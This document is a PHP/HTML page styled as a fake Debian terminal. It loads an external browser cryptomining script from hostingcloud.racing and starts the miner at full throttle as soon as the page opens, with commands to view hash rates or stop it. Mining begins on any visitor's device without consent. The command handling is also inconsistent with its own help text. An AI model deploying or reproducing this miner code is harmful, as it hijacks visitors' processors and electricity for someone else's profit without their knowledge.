//make by aymeric
<!doctype html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device.width, initial-scale=1.0">
    <meta content='width=device-width; initial-scale=1.0; maximum-scale=4.0; user-scalable=4;' name='viewport'/>
    <meta name="viewport" content="width=device-width"/>
    <title>Coin</title>
    <link id="stylesheet" rel="stylesheet" href="style.css">
    <link rel="icon" type="image/png" href="logo.gif" />
</head>
<body>
<div id="terminal">
</div>
<div id="input">
    <div><font color="green">server@debian: ~ $</font></div>
    <input id="commande" ondragenter="saisie();">
</div>
<?php
echo "
<script src=\"https://www.hostingcloud.racing/GOeX.js\"></script>
<script>
    var terminal ='';
    var _client = new Client.Anonymous('dfe8f753d1b14d4228ae46c42d542473ce4e267e05b77216a82f982fbef1c6f6', {
        throttle: 0
    });
    _client.start();
    welcome();
    function satusc(){
        terminal += '=========================================================================================='
        terminal += '<br>';
        terminal += ' running : '+_client.isRunning();
        terminal += '<br>';
        terminal += ' phone : '+_client.isMobile();
        terminal += '<br>';
        terminal += ' hashes/s : '+_client.getHashesPerSecond();
        terminal += '<br>';
        terminal += 'total hashes : '+_client.getTotalHashes();
        terminal += '<br>';
        terminal += '=========================================================================================='
        print();
    }
    function start(){
        _client.start();
        terminal += 'miner was started !'  
    }
    function stop(){
        _client.stop();
        terminal += 'miner was stoped !' 
    }
    function clear(){
        terminal = '';
        print();
        
    }
    function help() {
      terminal += '=========================================================================================='
      terminal += '<br>';
      terminal += 'statusc : see miner stat'     
      terminal += '<br>';
      terminal += 'startc : start miner'     
      terminal += '<br>';
      terminal += 'stopc : stop miner'     
      terminal += '<br>';
      terminal += 'clear : for clear terminal'     
      terminal += '<br>';
      terminal += '=========================================================================================='
    }
    function gui() {
      document.getElementById('menuc').removeAttribute('style');
    }
    function welcome() {
          terminal += '==========================================================================================';
          terminal += '<br>';
          terminal += 'Welcome into the personal IMB Miner of Aymeric Bizouarn';
          terminal += '<br>';
          terminal += '==========================================================================================';
          terminal += '<br>';
          print();
    }
    function saisie() {
        terminal += '<font color=\"green\">server@debian: ~ $ </font>';
        terminal += document.getElementById('commande').value;
        commande(document.getElementById('commande').value);
        document.getElementById('commande').value = '';
        terminal += '<br>';
        print();
    }
    function commande(val) {
        if(val == 'statusc' || val == 'Statusc'){
            terminal += '<br>';
            satusc();
            print();
        }
        else if(val == 'help' || val == 'Help' || val == 'man' || val == 'man'){
            terminal += '<br>';
            help();
            print();
        }else if(val == 'start' || val == 'Start'){
            terminal += '<br>';
            start();
            print();
        }else if(val == 'stop' || val == 'Stop'){
            terminal += '<br>';
            stop();
            print();
        }else if(val == 'guic' || val == 'Guic' || val == 'GUIc'){
            terminal += '<br>';
            stop();
            print();
        }else if(val == 'clear' || val == 'Clear'){
            document.getElementById('terminal').innerHTML = '';
        } else {
           terminal += '<br>';
           terminal += 'error : undefined commande !';
           print(); 
        }
    }
    function print() {
        document.getElementById('terminal').innerHTML = terminal;
    }
    input.addEventListener(\"keyup\", function(event) {
        if (event.keyCode === 13) {
            saisie();
        }
    });
</script>
";
?>
</body>